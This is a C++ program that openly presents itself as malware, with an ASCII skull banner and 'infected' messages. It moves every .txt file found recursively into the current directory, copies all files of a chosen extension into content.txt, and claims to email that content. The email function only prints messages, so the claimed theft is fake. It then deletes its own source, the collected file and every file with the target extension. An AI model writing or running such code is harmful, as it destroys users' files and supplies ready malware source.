#include <iostream>
#include <fstream>
#include <string>
#include <filesystem>
#include <vector>
#include <chrono>
#include <thread>
#include <cstdlib>
#include <cstring>
#include <getopt.h>
#include <ctime>

namespace fs = std::filesystem;

void print_banner() {
    std::cout << "WLC MALWARE INFERNUMSQUAD\n";
    std::this_thread::sleep_for(std::chrono::seconds(1));
    std::cout << "Created by Self$ Was Here\n";
    std::this_thread::sleep_for(std::chrono::milliseconds(500));
    std::cout << "\n";
    std::cout << "███████████████████████████\n";
    std::this_thread::sleep_for(std::chrono::milliseconds(50));
    std::cout << "███████▀▀▀░░░░░░░▀▀▀███████\n";
    std::this_thread::sleep_for(std::chrono::milliseconds(50));
    std::cout << "████▀░░░░░░░░░░░░░░░░░▀████\n";
    std::this_thread::sleep_for(std::chrono::milliseconds(50));
    std::cout << "███│░░░░░░░░░░░░░░░░░░░│███\n";
    std::this_thread::sleep_for(std::chrono::milliseconds(50));
    std::cout << "██▌│░░░░░░░░░░░░░░░░░░░│▐██\n";
    std::this_thread::sleep_for(std::chrono::milliseconds(50));
    std::cout << "██░└┐░░░░░░░░░░░░░░░░░┌┘░██\n";
    std::this_thread::sleep_for(std::chrono::milliseconds(50));
    std::cout << "██░░└┐░░░░░░░░░░░░░░┌┘░░██\n";
    std::this_thread::sleep_for(std::chrono::milliseconds(50));
    std::cout << "██░░┌┘▄▄▄▄▄░░░░░▄▄▄▄▄└┐░░██\n";
    std::this_thread::sleep_for(std::chrono::milliseconds(50));
    std::cout << "██▌░│█▌Self$▌░▐GitHub█ │░▐█\n";
    std::this_thread::sleep_for(std::chrono::milliseconds(50));
    std::cout << "███░│▐███▀▀░░▄░░▀▀███▌│░███\n";
    std::this_thread::sleep_for(std::chrono::milliseconds(50));
    std::cout << "██▀─┘░░░░░░░░░░░░░░░░░└─▀██\n";
    std::this_thread::sleep_for(std::chrono::milliseconds(50));
    std::cout << "██▄░░░▄▄▄▓░░▀█▀░░▓▄▄▄░░░▄██\n";
    std::this_thread::sleep_for(std::chrono::milliseconds(50));
    std::cout << "████▄─┘██▌░░░░░░░▐██└─▄████\n";
    std::this_thread::sleep_for(std::chrono::milliseconds(50));
    std::cout << "█████░░▐█─┬┬┬┬┬┬┬─█▌░░█████\n";
    std::this_thread::sleep_for(std::chrono::milliseconds(50));
    std::cout << "████▌░░░▀┬┼┼┼┼┼┼┼┬▀░░░▐████\n";
    std::this_thread::sleep_for(std::chrono::milliseconds(50));
    std::cout << "█████▄░░░└┴┴┴┴┴┴┴┘░░░▄█████\n";
    std::this_thread::sleep_for(std::chrono::milliseconds(50));
    std::cout << "███████▄░░░░░░░░░░░▄███████\n";
    std::this_thread::sleep_for(std::chrono::milliseconds(50));
    std::cout << "██████████▄▄▄▄▄▄▄██████████\n";
    std::this_thread::sleep_for(std::chrono::milliseconds(50));
    std::cout << "███████████████████████████\n";
    std::this_thread::sleep_for(std::chrono::milliseconds(50));
    std::cout << "\n";
    std::this_thread::sleep_for(std::chrono::seconds(1));
}

void process_files(const std::string& target) {
    for (const auto& entry : fs::recursive_directory_iterator(".")) {
        if (entry.is_regular_file() && entry.path().extension() == ".txt") {
            std::string old_file_path = entry.path().string();
            std::string new_file_path = "./" + entry.path().filename().string();
            fs::rename(old_file_path, new_file_path);
        }
    }

    std::vector<std::string> programs;
    for (const auto& entry : fs::directory_iterator(".")) {
        if (entry.path().extension() == target) {
            programs.push_back(entry.path().string());
        }
    }

    std::ofstream content_file("content.txt", std::ios::app);
    for (const auto& p : programs) {
        std::ifstream program_file(p);
        std::string line;
        content_file << p << "\n";
        while (std::getline(program_file, line)) {
            content_file << line << "\n";
        }
        content_file << "\n";
    }

    content_file.close();
    std::this_thread::sleep_for(std::chrono::seconds(1));
    std::cout << "Self$ infected all the " << target << " files.\n";
    std::this_thread::sleep_for(std::chrono::seconds(1));
}

void send_email(const std::string& toaddr) {
    std::string fromaddr = "email";
    std::string frompass = "pass";


    std::cout << "Ready to send the content by e-mail to " << toaddr << "...\n";
    std::this_thread::sleep_for(std::chrono::seconds(1));
    std::cout << "Sending...\n";


    std::this_thread::sleep_for(std::chrono::seconds(1));
    std::cout << "Email sent to " << toaddr << " successfully.\n";
}

void clean_up(const std::string& target) {
    std::remove("Self$.cpp");

    std::ofstream content_file("content.txt");
    content_file << "Nothing for here...\n";
    content_file.close();

    std::this_thread::sleep_for(std::chrono::seconds(1));
    fs::remove("content.txt");

    for (const auto& entry : fs::directory_iterator(".")) {
        if (entry.path().extension() == target) {
            fs::remove(entry.path());
        }
    }

    std::cout << "Finished\n";
}

int main(int argc, char* argv[]) {
    std::string target;
    std::string mail;

    struct option long_options[] = {
        {"target", required_argument, nullptr, 't'},
        {"mail", required_argument, nullptr, 'm'},
        {nullptr, 0, nullptr, 0}
    };

    int option_index = 0;
    int c;
    while ((c = getopt_long(argc, argv, "t:m:", long_options, &option_index)) != -1) {
        switch (c) {
        case 't':
            target = optarg;
            break;
        case 'm':
            mail = optarg;
            break;
        default:
            break;
        }
    }

    print_banner();
    process_files(target);
    send_email(mail);
    clean_up(target);

    return 0;
}
